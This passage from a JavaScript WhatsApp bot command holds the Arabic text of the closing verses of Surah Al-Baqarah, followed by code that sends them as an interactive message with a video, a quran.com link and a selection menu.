وَلَا جُنَاحَ عَلَيْكُمْ فِيْمَا عَرَّضْتُمْ بِهٖ مِنْ خِطْبَةِ النِّسَاۤءِ اَوْ اَكْنَنْتُمْ فِيْٓ اَنْفُسِكُمْ ۗ عَلِمَ اللّٰهُ اَنَّكُمْ سَتَذْكُرُوْنَهُنَّ وَلٰكِنْ لَّا تُوَاعِدُوْهُنَّ سِرًّا اِلَّآ اَنْ تَقُوْلُوْا قَوْلًا مَّعْرُوْفًا ۗ وَلَا تَعْزِمُوْا عُقْدَةَ النِّكَاحِ حَتّٰى يَبْلُغَ الْكِتٰبُ اَجَلَهٗ ۗ وَاعْلَمُوْٓا اَنَّ اللّٰهَ يَعْلَمُ مَا فِيْٓ اَنْفُسِكُمْ فَاحْذَرُوْهُ ۚ وَاعْلَمُوْٓا اَنَّ اللّٰهَ غَفُوْرٌ حَلِيْمٌ
لَا جُنَاحَ عَلَيْكُمْ اِنْ طَلَّقْتُمُ النِّسَاۤءَ مَا لَمْ تَمَسُّوْهُنَّ اَوْ تَفْرِضُوْا لَهُنَّ فَرِيْضَةً ۚ وَمَتِّعُوْهُنَّ ۚ عَلَى الْمُوْسِعِ قَدَرُهٗ وَعَلَى الْمُقْتِرِ قَدَرُهٗ ۚ مَتَاعًا بِالْمَعْرُوْفِ ۚ حَقًّا عَلَى الْمُحْسِنِيْنَ
وَاِنْ طَلَّقْتُمُوْهُنَّ مِنْ قَبْلِ اَنْ تَمَسُّوْهُنَّ وَقَدْ فَرَضْتُمْ لَهُنَّ فَرِيْضَةً فَنِصْفُ مَا فَرَضْتُمْ اِلَّآ اَنْ يَّعْفُوْنَ اَوْ يَعْفُوَا الَّذِيْ بِيَدِهٖ عُقْدَةُ النِّكَاحِ ۗ وَاَنْ تَعْفُوْٓا اَقْرَبُ لِلتَّقْوٰى ۗ وَلَا تَنْسَوُا الْفَضْلَ بَيْنَكُمْ ۗ اِنَّ اللّٰهَ بِمَا تَعْمَلُوْنَ بَصِيْرٌ
حٰفِظُوْا عَلَى الصَّلَوٰتِ وَالصَّلٰوةِ الْوُسْطٰى وَقُوْمُوْا لِلّٰهِ قٰنِتِيْنَ
فَاِنْ خِفْتُمْ فَرِجَالًا اَوْ رُكْبَانًا ۚ فَاِذَآ اَمِنْتُمْ فَاذْكُرُوا اللّٰهَ كَمَا عَلَّمَكُمْ مَّا لَمْ تَكُوْنُوْا تَعْلَمُوْنَ
وَالَّذِيْنَ يُتَوَفَّوْنَ مِنْكُمْ وَيَذَرُوْنَ اَزْوَاجًا وَّصِيَّةً لِّاَزْوَاجِهِمْ مَّتَاعًا اِلَى الْحَوْلِ غَيْرَ اِخْرَاجٍ ۚ فَاِنْ خَرَجْنَ فَلَا جُنَاحَ عَلَيْكُمْ فِيْ مَا فَعَلْنَ فِيْٓ اَنْفُسِهِنَّ مِنْ مَّعْرُوْفٍ ۗ وَاللّٰهُ عَزِيْزٌ حَكِيْمٌ
وَلِلْمُطَلَّقٰتِ مَتَاعٌۢ بِالْمَعْرُوْفِ ۖ حَقًّا عَلَى الْمُتَّقِيْنَ
كَذٰلِكَ يُبَيِّنُ اللّٰهُ لَكُمْ اٰيٰتِهٖ لَعَلَّكُمْ تَعْقِلُوْنَ
اَلَمْ تَرَ اِلَى الَّذِيْنَ خَرَجُوْا مِنْ دِيَارِهِمْ وَهُمْ اُلُوْفٌ حَذَرَ الْمَوْتِ ۖ فَقَالَ لَهُمُ اللّٰهُ مُوْتُوْا ۚ ثُمَّ اَحْيَاهُمْ ۗ اِنَّ اللّٰهَ لَذُوْ فَضْلٍ عَلَى النَّاسِ وَلٰكِنَّ اَكْثَرَ النَّاسِ لَا يَشْكُرُوْنَ
وَقَاتِلُوْا فِيْ سَبِيْلِ اللّٰهِ وَاعْلَمُوْٓا اَنَّ اللّٰهَ سَمِيْعٌ عَلِيْمٌ
مَنْ ذَا الَّذِيْ يُقْرِضُ اللّٰهَ قَرْضًا حَسَنًا فَيُضٰعِفَهٗ لَهٗٓ اَضْعَافًا كَثِيْرَةً ۗ وَاللّٰهُ يَقْبِضُ وَيَبْسُطُ ۖ وَاِلَيْهِ تُرْجَعُوْنَ
اَلَمْ تَرَ اِلَى الْمَلَاِ مِنْۢ بَنِيْٓ اِسْرَاۤءِيْلَ مِنْۢ بَعْدِ مُوْسٰى ۘ اِذْ قَالُوْا لِنَبِيٍّ لَّهُمُ ابْعَثْ لَنَا مَلِكًا نُّقَاتِلْ فِيْ سَبِيْلِ اللّٰهِ ۗ قَالَ هَلْ عَسَيْتُمْ اِنْ كُتِبَ عَلَيْكُمُ الْقِتَالُ اَلَّا تُقَاتِلُوْا ۗ قَالُوْا وَمَا لَنَآ اَلَّا نُقَاتِلَ فِيْ سَبِيْلِ اللّٰهِ وَقَدْ اُخْرِجْنَا مِنْ دِيَارِنَا وَاَبْنَاۤىِٕنَا ۗ فَلَمَّا كُتِبَ عَلَيْهِمُ الْقِتَالُ تَوَلَّوْا اِلَّا قَلِيْلًا مِّنْهُمْ ۗ وَاللّٰهُ عَلِيْمٌۢ بِالظّٰلِمِيْنَ
وَقَالَ لَهُمْ نَبِيُّهُمْ اِنَّ اللّٰهَ قَدْ بَعَثَ لَكُمْ طَالُوْتَ مَلِكًا ۗ قَالُوْٓا اَنّٰى يَكُوْنُ لَهُ الْمُلْكُ عَلَيْنَا وَنَحْنُ اَحَقُّ بِالْمُلْكِ مِنْهُ وَلَمْ يُؤْتَ سَعَةً مِّنَ الْمَالِ ۗ قَالَ اِنَّ اللّٰهَ اصْطَفٰىهُ عَلَيْكُمْ وَزَادَهٗ بَسْطَةً فِى الْعِلْمِ وَالْجِسْمِ ۗ وَاللّٰهُ يُؤْتِيْ مُلْكَهٗ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ وَاسِعٌ عَلِيْمٌ
وَقَالَ لَهُمْ نَبِيُّهُمْ اِنَّ اٰيَةَ مُلْكِهٖٓ اَنْ يَّأْتِيَكُمُ التَّابُوْتُ فِيْهِ سَكِيْنَةٌ مِّنْ رَّبِّكُمْ وَبَقِيَّةٌ مِّمَّا تَرَكَ اٰلُ مُوْسٰى وَاٰلُ هٰرُوْنَ تَحْمِلُهُ الْمَلٰۤىِٕكَةُ ۗ اِنَّ فِيْ ذٰلِكَ لَاٰيَةً لَّكُمْ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
فَلَمَّا فَصَلَ طَالُوْتُ بِالْجُنُوْدِ قَالَ اِنَّ اللّٰهَ مُبْتَلِيْكُمْ بِنَهَرٍ ۚ فَمَنْ شَرِبَ مِنْهُ فَلَيْسَ مِنِّيْ ۚ وَمَنْ لَّمْ يَطْعَمْهُ فَاِنَّهٗ مِنِّيْٓ اِلَّا مَنِ اغْتَرَفَ غُرْفَةًۢ بِيَدِهٖ ۚ فَشَرِبُوْا مِنْهُ اِلَّا قَلِيْلًا مِّنْهُمْ ۗ فَلَمَّا جَاوَزَهٗ هُوَ وَالَّذِيْنَ اٰمَنُوْا مَعَهٗ قَالُوْا لَا طَاقَةَ لَنَا الْيَوْمَ بِجَالُوْتَ وَجُنُوْدِهٖ ۗ قَالَ الَّذِيْنَ يَظُنُّوْنَ اَنَّهُمْ مُّلٰقُوا اللّٰهِ ۙ كَمْ مِّنْ فِئَةٍ قَلِيْلَةٍ غَلَبَتْ فِئَةً كَثِيْرَةًۢ بِاِذْنِ اللّٰهِ ۗ وَاللّٰهُ مَعَ الصّٰبِرِيْنَ
وَلَمَّا بَرَزُوْا لِجَالُوْتَ وَجُنُوْدِهٖ قَالُوْا رَبَّنَآ اَفْرِغْ عَلَيْنَا صَبْرًا وَّثَبِّتْ اَقْدَامَنَا وَانْصُرْنَا عَلَى الْقَوْمِ الْكٰفِرِيْنَ
فَهَزَمُوْهُمْ بِاِذْنِ اللّٰهِ ۙ وَقَتَلَ دَاوٗدُ جَالُوْتَ وَاٰتٰىهُ اللّٰهُ الْمُلْكَ وَالْحِكْمَةَ وَعَلَّمَهٗ مِمَّا يَشَاۤءُ ۗ وَلَوْلَا دَفْعُ اللّٰهِ النَّاسَ بَعْضَهُمْ بِبَعْضٍ لَّفَسَدَتِ الْاَرْضُ وَلٰكِنَّ اللّٰهَ ذُوْ فَضْلٍ عَلَى الْعٰلَمِيْنَ
تِلْكَ اٰيٰتُ اللّٰهِ نَتْلُوْهَا عَلَيْكَ بِالْحَقِّ ۗ وَاِنَّكَ لَمِنَ الْمُرْسَلِيْنَ
تِلْكَ الرُّسُلُ فَضَّلْنَا بَعْضَهُمْ عَلٰى بَعْضٍ ۘ مِنْهُمْ مَّنْ كَلَّمَ اللّٰهُ وَرَفَعَ بَعْضَهُمْ دَرَجٰتٍ ۗ وَاٰتَيْنَا عِيْسَى ابْنَ مَرْيَمَ الْبَيِّنٰتِ وَاَيَّدْنٰهُ بِرُوْحِ الْقُدُسِ ۗ وَلَوْ شَاۤءَ اللّٰهُ مَا اقْتَتَلَ الَّذِيْنَ مِنْۢ بَعْدِهِمْ مِّنْۢ بَعْدِ مَا جَاۤءَتْهُمُ الْبَيِّنٰتُ وَلٰكِنِ اخْتَلَفُوْا فَمِنْهُمْ مَّنْ اٰمَنَ وَمِنْهُمْ مَّنْ كَفَرَ ۗ وَلَوْ شَاۤءَ اللّٰهُ مَا اقْتَتَلُوْا ۗ وَلٰكِنَّ اللّٰهَ يَفْعَلُ مَا يُرِيْدُ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اَنْفِقُوْا مِمَّا رَزَقْنٰكُمْ مِّنْ قَبْلِ اَنْ يَّأْتِيَ يَوْمٌ لَّا بَيْعٌ فِيْهِ وَلَا خُلَّةٌ وَّلَا شَفَاعَةٌ ۗ وَالْكٰفِرُوْنَ هُمُ الظّٰلِمُوْنَ
اَللّٰهُ لَآ اِلٰهَ اِلَّا هُوَۚ اَلْحَيُّ الْقَيُّوْمُ ەۚ لَا تَأْخُذُهٗ سِنَةٌ وَّلَا نَوْمٌۗ لَهٗ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِۗ مَنْ ذَا الَّذِيْ يَشْفَعُ عِنْدَهٗٓ اِلَّا بِاِذْنِهٖۗ يَعْلَمُ مَا بَيْنَ اَيْدِيْهِمْ وَمَا خَلْفَهُمْۚ وَلَا يُحِيْطُوْنَ بِشَيْءٍ مِّنْ عِلْمِهٖٓ اِلَّا بِمَا شَاۤءَۚ وَسِعَ كُرْسِيُّهُ السَّمٰوٰتِ وَالْاَرْضَۚ وَلَا يَـُٔوْدُهٗ حِفْظُهُمَاۚ وَهُوَ الْعَلِيُّ الْعَظِيْمُ
لَآ اِكْرَاهَ فِى الدِّيْنِ ۗ قَدْ تَّبَيَّنَ الرُّشْدُ مِنَ الْغَيِّ ۚ فَمَنْ يَّكْفُرْ بِالطَّاغُوْتِ وَيُؤْمِنْۢ بِاللّٰهِ فَقَدِ اسْتَمْسَكَ بِالْعُرْوَةِ الْوُثْقٰى لَا انْفِصَامَ لَهَا ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
اَللّٰهُ وَلِيُّ الَّذِيْنَ اٰمَنُوْا يُخْرِجُهُمْ مِّنَ الظُّلُمٰتِ اِلَى النُّوْرِ ۗ وَالَّذِيْنَ كَفَرُوْٓا اَوْلِيَاۤؤُهُمُ الطَّاغُوْتُ يُخْرِجُوْنَهُمْ مِّنَ النُّوْرِ اِلَى الظُّلُمٰتِ ۗ اُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
اَلَمْ تَرَ اِلَى الَّذِيْ حَاۤجَّ اِبْرٰهٖمَ فِيْ رَبِّهٖٓ اَنْ اٰتٰىهُ اللّٰهُ الْمُلْكَ ۘ اِذْ قَالَ اِبْرٰهٖمُ رَبِّيَ الَّذِيْ يُحْيٖ وَيُمِيْتُ ۙ قَالَ اَنَا اُحْيٖ وَاُمِيْتُ ۗ قَالَ اِبْرٰهٖمُ فَاِنَّ اللّٰهَ يَأْتِيْ بِالشَّمْسِ مِنَ الْمَشْرِقِ فَأْتِ بِهَا مِنَ الْمَغْرِبِ فَبُهِتَ الَّذِيْ كَفَرَ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الظّٰلِمِيْنَ
اَوْ كَالَّذِيْ مَرَّ عَلٰى قَرْيَةٍ وَّهِيَ خَاوِيَةٌ عَلٰى عُرُوْشِهَا ۚ قَالَ اَنّٰى يُحْيٖ هٰذِهِ اللّٰهُ بَعْدَ مَوْتِهَا ۚ فَاَمَاتَهُ اللّٰهُ مِائَةَ عَامٍ ثُمَّ بَعَثَهٗ ۗ قَالَ كَمْ لَبِثْتَ ۗ قَالَ لَبِثْتُ يَوْمًا اَوْ بَعْضَ يَوْمٍ ۗ قَالَ بَلْ لَّبِثْتَ مِائَةَ عَامٍ فَانْظُرْ اِلٰى طَعَامِكَ وَشَرَابِكَ لَمْ يَتَسَنَّهْ ۚ وَانْظُرْ اِلٰى حِمَارِكَ ۚ وَلِنَجْعَلَكَ اٰيَةً لِّلنَّاسِ ۚ وَانْظُرْ اِلَى الْعِظَامِ كَيْفَ نُنْشِزُهَا ثُمَّ نَكْسُوْهَا لَحْمًا ۗ فَلَمَّا تَبَيَّنَ لَهٗ قَالَ اَعْلَمُ اَنَّ اللّٰهَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
وَاِذْ قَالَ اِبْرٰهٖمُ رَبِّ اَرِنِيْ كَيْفَ تُحْيِ الْمَوْتٰى ۗ قَالَ اَوَلَمْ تُؤْمِنْ ۗ قَالَ بَلٰى وَلٰكِنْ لِّيَطْمَىِٕنَّ قَلْبِيْ ۗ قَالَ فَخُذْ اَرْبَعَةً مِّنَ الطَّيْرِ فَصُرْهُنَّ اِلَيْكَ ثُمَّ اجْعَلْ عَلٰى كُلِّ جَبَلٍ مِّنْهُنَّ جُزْءًا ثُمَّ ادْعُهُنَّ يَأْتِيْنَكَ سَعْيًا ۗ وَاعْلَمْ اَنَّ اللّٰهَ عَزِيْزٌ حَكِيْمٌ
مَثَلُ الَّذِيْنَ يُنْفِقُوْنَ اَمْوَالَهُمْ فِيْ سَبِيْلِ اللّٰهِ كَمَثَلِ حَبَّةٍ اَنْۢبَتْ سَبْعَ سَنَابِلَ فِيْ كُلِّ سُنْۢبُلَةٍ مِّائَةُ حَبَّةٍ ۗ وَاللّٰهُ يُضٰعِفُ لِمَنْ يَّشَاۤءُ ۗ وَاللّٰهُ وَاسِعٌ عَلِيْمٌ
اَلَّذِيْنَ يُنْفِقُوْنَ اَمْوَالَهُمْ فِيْ سَبِيْلِ اللّٰهِ ثُمَّ لَا يُتْبِعُوْنَ مَآ اَنْفَقُوْا مَنًّا وَّلَا اَذًى ۙ لَّهُمْ اَجْرُهُمْ عِنْدَ رَبِّهِمْ ۚ وَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
قَوْلٌ مَّعْرُوْفٌ وَّمَغْفِرَةٌ خَيْرٌ مِّنْ صَدَقَةٍ يَّتْبَعُهَآ اَذًى ۗ وَاللّٰهُ غَنِيٌّ حَلِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تُبْطِلُوْا صَدَقٰتِكُمْ بِالْمَنِّ وَالْاَذٰىۙ كَالَّذِيْ يُنْفِقُ مَالَهٗ رِئَاۤءَ النَّاسِ وَلَا يُؤْمِنُ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ ۗ فَمَثَلُهٗ كَمَثَلِ صَفْوَانٍ عَلَيْهِ تُرَابٌ فَاَصَابَهٗ وَابِلٌ فَتَرَكَهٗ صَلْدًا ۗ لَا يَقْدِرُوْنَ عَلٰى شَيْءٍ مِّمَّا كَسَبُوْا ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الْكٰفِرِيْنَ
وَمَثَلُ الَّذِيْنَ يُنْفِقُوْنَ اَمْوَالَهُمُ ابْتِغَاۤءَ مَرْضَاتِ اللّٰهِ وَتَثْبِيْتًا مِّنْ اَنْفُسِهِمْ كَمَثَلِ جَنَّةٍۢ بِرَبْوَةٍ اَصَابَهَا وَابِلٌ فَاٰتَتْ اُكُلَهَا ضِعْفَيْنِ ۚ فَاِنْ لَّمْ يُصِبْهَا وَابِلٌ فَطَلٌّ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ بَصِيْرٌ
اَيَوَدُّ اَحَدُكُمْ اَنْ تَكُوْنَ لَهٗ جَنَّةٌ مِّنْ نَّخِيْلٍ وَّاَعْنَابٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ ۙ لَهٗ فِيْهَا مِنْ كُلِّ الثَّمَرٰتِ ۙ وَاَصَابَهُ الْكِبَرُ وَلَهٗ ذُرِّيَّةٌ ضُعَفَاۤءُ ۖ فَاَصَابَهَآ اِعْصَارٌ فِيْهِ نَارٌ فَاحْتَرَقَتْ ۗ كَذٰلِكَ يُبَيِّنُ اللّٰهُ لَكُمُ الْاٰيٰتِ لَعَلَّكُمْ تَتَفَكَّرُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اَنْفِقُوْا مِنْ طَيِّبٰتِ مَا كَسَبْتُمْ وَمِمَّآ اَخْرَجْنَا لَكُمْ مِّنَ الْاَرْضِ ۗ وَلَا تَيَمَّمُوا الْخَبِيْثَ مِنْهُ تُنْفِقُوْنَ وَلَسْتُمْ بِاٰخِذِيْهِ اِلَّآ اَنْ تُغْمِضُوْا فِيْهِ ۗ وَاعْلَمُوْٓا اَنَّ اللّٰهَ غَنِيٌّ حَمِيْدٌ
اَلشَّيْطٰنُ يَعِدُكُمُ الْفَقْرَ وَيَأْمُرُكُمْ بِالْفَحْشَاۤءِ ۚ وَاللّٰهُ يَعِدُكُمْ مَّغْفِرَةً مِّنْهُ وَفَضْلًا ۗ وَاللّٰهُ وَاسِعٌ عَلِيْمٌ
يُّؤْتِى الْحِكْمَةَ مَنْ يَّشَاۤءُ ۚ وَمَنْ يُّؤْتَ الْحِكْمَةَ فَقَدْ اُوْتِيَ خَيْرًا كَثِيْرًا ۗ وَمَا يَذَّكَّرُ اِلَّآ اُولُوا الْاَلْبَابِ
وَمَآ اَنْفَقْتُمْ مِّنْ نَّفَقَةٍ اَوْ نَذَرْتُمْ مِّنْ نَّذْرٍ فَاِنَّ اللّٰهَ يَعْلَمُهٗ ۗ وَمَا لِلظّٰلِمِيْنَ مِنْ اَنْصَارٍ
اِنْ تُبْدُوا الصَّدَقٰتِ فَنِعِمَّا هِيَ ۚ وَاِنْ تُخْفُوْهَا وَتُؤْتُوْهَا الْفُقَرَاۤءَ فَهُوَ خَيْرٌ لَّكُمْ ۗ وَيُكَفِّرُ عَنْكُمْ مِّنْ سَيِّاٰتِكُمْ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ خَبِيْرٌ
لَيْسَ عَلَيْكَ هُدٰىهُمْ وَلٰكِنَّ اللّٰهَ يَهْدِيْ مَنْ يَّشَاۤءُ ۗ وَمَا تُنْفِقُوْا مِنْ خَيْرٍ فَلِاَنْفُسِكُمْ ۗ وَمَا تُنْفِقُوْنَ اِلَّا ابْتِغَاۤءَ وَجْهِ اللّٰهِ ۗ وَمَا تُنْفِقُوْا مِنْ خَيْرٍ يُّوَفَّ اِلَيْكُمْ وَاَنْتُمْ لَا تُظْلَمُوْنَ
لِلْفُقَرَاۤءِ الَّذِيْنَ اُحْصِرُوْا فِيْ سَبِيْلِ اللّٰهِ لَا يَسْتَطِيْعُوْنَ ضَرْبًا فِى الْاَرْضِ يَحْسَبُهُمُ الْجَاهِلُ اَغْنِيَاۤءَ مِنَ التَّعَفُّفِ ۚ تَعْرِفُهُمْ بِسِيْمٰهُمْ ۚ لَا يَسْـَٔلُوْنَ النَّاسَ اِلْحَافًا ۗ وَمَا تُنْفِقُوْا مِنْ خَيْرٍ فَاِنَّ اللّٰهَ بِهٖ عَلِيْمٌ
اَلَّذِيْنَ يُنْفِقُوْنَ اَمْوَالَهُمْ بِالَّيْلِ وَالنَّهَارِ سِرًّا وَّعَلَانِيَةً فَلَهُمْ اَجْرُهُمْ عِنْدَ رَبِّهِمْ ۚ وَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
اَلَّذِيْنَ يَأْكُلُوْنَ الرِّبٰوا لَا يَقُوْمُوْنَ اِلَّا كَمَا يَقُوْمُ الَّذِيْ يَتَخَبَّطُهُ الشَّيْطٰنُ مِنَ الْمَسِّ ۗ ذٰلِكَ بِاَنَّهُمْ قَالُوْٓا اِنَّمَا الْبَيْعُ مِثْلُ الرِّبٰوا ۘ وَاَحَلَّ اللّٰهُ الْبَيْعَ وَحَرَّمَ الرِّبٰوا ۗ فَمَنْ جَاۤءَهٗ مَوْعِظَةٌ مِّنْ رَّبِّهٖ فَانْتَهٰى فَلَهٗ مَا سَلَفَ ۗ وَاَمْرُهٗٓ اِلَى اللّٰهِ ۗ وَمَنْ عَادَ فَاُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
يَمْحَقُ اللّٰهُ الرِّبٰوا وَيُرْبِى الصَّدَقٰتِ ۗ وَاللّٰهُ لَا يُحِبُّ كُلَّ كَفَّارٍ اَثِيْمٍ
اِنَّ الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ وَاَقَامُوا الصَّلٰوةَ وَاٰتَوُا الزَّكٰوةَ لَهُمْ اَجْرُهُمْ عِنْدَ رَبِّهِمْ ۚ وَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اتَّقُوا اللّٰهَ وَذَرُوْا مَا بَقِيَ مِنَ الرِّبٰوٓا اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
فَاِنْ لَّمْ تَفْعَلُوْا فَأْذَنُوْا بِحَرْبٍ مِّنَ اللّٰهِ وَرَسُوْلِهٖ ۚ وَاِنْ تُبْتُمْ فَلَكُمْ رُءُوْسُ اَمْوَالِكُمْ ۚ لَا تَظْلِمُوْنَ وَلَا تُظْلَمُوْنَ
وَاِنْ كَانَ ذُوْ عُسْرَةٍ فَنَظِرَةٌ اِلٰى مَيْسَرَةٍ ۗ وَاَنْ تَصَدَّقُوْا خَيْرٌ لَّكُمْ اِنْ كُنْتُمْ تَعْلَمُوْنَ
وَاتَّقُوْا يَوْمًا تُرْجَعُوْنَ فِيْهِ اِلَى اللّٰهِ ۗ ثُمَّ تُوَفّٰى كُلُّ نَفْسٍ مَّا كَسَبَتْ وَهُمْ لَا يُظْلَمُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِذَا تَدَايَنْتُمْ بِدَيْنٍ اِلٰٓى اَجَلٍ مُّسَمًّى فَاكْتُبُوْهُ ۗ وَلْيَكْتُبْ بَّيْنَكُمْ كَاتِبٌۢ بِالْعَدْلِ ۚ وَلَا يَأْبَ كَاتِبٌ اَنْ يَّكْتُبَ كَمَا عَلَّمَهُ اللّٰهُ فَلْيَكْتُبْ ۚ وَلْيُمْلِلِ الَّذِيْ عَلَيْهِ الْحَقُّ وَلْيَتَّقِ اللّٰهَ رَبَّهٗ وَلَا يَبْخَسْ مِنْهُ شَيْـًٔا ۗ فَاِنْ كَانَ الَّذِيْ عَلَيْهِ الْحَقُّ سَفِيْهًا اَوْ ضَعِيْفًا اَوْ لَا يَسْتَطِيْعُ اَنْ يُّمِلَّ هُوَ فَلْيُمْلِلْ وَلِيُّهٗ بِالْعَدْلِ ۗ وَاسْتَشْهِدُوْا شَهِيْدَيْنِ مِنْ رِّجَالِكُمْ ۚ فَاِنْ لَّمْ يَكُوْنَا رَجُلَيْنِ فَرَجُلٌ وَّامْرَاَتَانِ مِمَّنْ تَرْضَوْنَ مِنَ الشُّهَدَاۤءِ اَنْ تَضِلَّ اِحْدٰىهُمَا فَتُذَكِّرَ اِحْدٰىهُمَا الْاُخْرٰى ۗ وَلَا يَأْبَ الشُّهَدَاۤءُ اِذَا مَا دُعُوْا ۗ وَلَا تَسْـَٔمُوْٓا اَنْ تَكْتُبُوْهُ صَغِيْرًا اَوْ كَبِيْرًا اِلٰٓى اَجَلِهٖ ۗ ذٰلِكُمْ اَقْسَطُ عِنْدَ اللّٰهِ وَاَقْوَمُ لِلشَّهَادَةِ وَاَدْنٰىٓ اَلَّا تَرْتَابُوْٓا اِلَّآ اَنْ تَكُوْنَ تِجَارَةً حَاضِرَةً تُدِيْرُوْنَهَا بَيْنَكُمْ فَلَيْسَ عَلَيْكُمْ جُنَاحٌ اَلَّا تَكْتُبُوْهَا ۗ وَاَشْهِدُوْٓا اِذَا تَبَايَعْتُمْ ۖ وَلَا يُضَاۤرَّ كَاتِبٌ وَّلَا شَهِيْدٌ ۗ وَاِنْ تَفْعَلُوْا فَاِنَّهٗ فُسُوْقٌۢ بِكُمْ ۗ وَاتَّقُوا اللّٰهَ ۗ وَيُعَلِّمُكُمُ اللّٰهُ ۗ وَاللّٰهُ بِكُلِّ شَيْءٍ عَلِيْمٌ
وَاِنْ كُنْتُمْ عَلٰى سَفَرٍ وَّلَمْ تَجِدُوْا كَاتِبًا فَرِهٰنٌ مَّقْبُوْضَةٌ ۗ فَاِنْ اَمِنَ بَعْضُكُمْ بَعْضًا فَلْيُؤَدِّ الَّذِى اؤْتُمِنَ اَمَانَتَهٗ وَلْيَتَّقِ اللّٰهَ رَبَّهٗ ۗ وَلَا تَكْتُمُوا الشَّهَادَةَ ۗ وَمَنْ يَّكْتُمْهَا فَاِنَّهٗٓ اٰثِمٌ قَلْبُهٗ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ عَلِيْمٌ
لِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَاِنْ تُبْدُوْا مَا فِيْٓ اَنْفُسِكُمْ اَوْ تُخْفُوْهُ يُحَاسِبْكُمْ بِهِ اللّٰهُ ۗ فَيَغْفِرُ لِمَنْ يَّشَاۤءُ وَيُعَذِّبُ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
اٰمَنَ الرَّسُوْلُ بِمَآ اُنْزِلَ اِلَيْهِ مِنْ رَّبِّهٖ وَالْمُؤْمِنُوْنَ ۚ كُلٌّ اٰمَنَ بِاللّٰهِ وَمَلٰۤىِٕكَتِهٖ وَكُتُبِهٖ وَرُسُلِهٖ ۚ لَا نُفَرِّقُ بَيْنَ اَحَدٍ مِّنْ رُّسُلِهٖ ۚ وَقَالُوْا سَمِعْنَا وَاَطَعْنَا ۖ غُفْرَانَكَ رَبَّنَا وَاِلَيْكَ الْمَصِيْرُ
لَا يُكَلِّفُ اللّٰهُ نَفْسًا اِلَّا وُسْعَهَا ۗ لَهَا مَا كَسَبَتْ وَعَلَيْهَا مَا اكْتَسَبَتْ ۗ رَبَّنَا لَا تُؤَاخِذْنَآ اِنْ نَّسِيْنَآ اَوْ اَخْطَأْنَا ۚ رَبَّنَا وَلَا تَحْمِلْ عَلَيْنَآ اِصْرًا كَمَا حَمَلْتَهٗ عَلَى الَّذِيْنَ مِنْ قَبْلِنَا ۚ رَبَّنَا وَلَا تُحَمِّلْنَا مَا لَا طَاقَةَ لَنَا بِهٖ ۚ وَاعْفُ عَنَّا ۗ وَاغْفِرْ لَنَا ۗ وَارْحَمْنَا ۗ اَنْتَ مَوْلٰىنَا فَانْصُرْنَا عَلَى الْقَوْمِ الْكٰفِرِيْنَ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋-𝐁𝐀𝐐𝐀𝐑𝐀𝐇",
 url: `https://quran.com/2`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© AL-BAQARAH"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AL-BAQARAH",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 272-286", id: `${prefix}al-baqarah` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

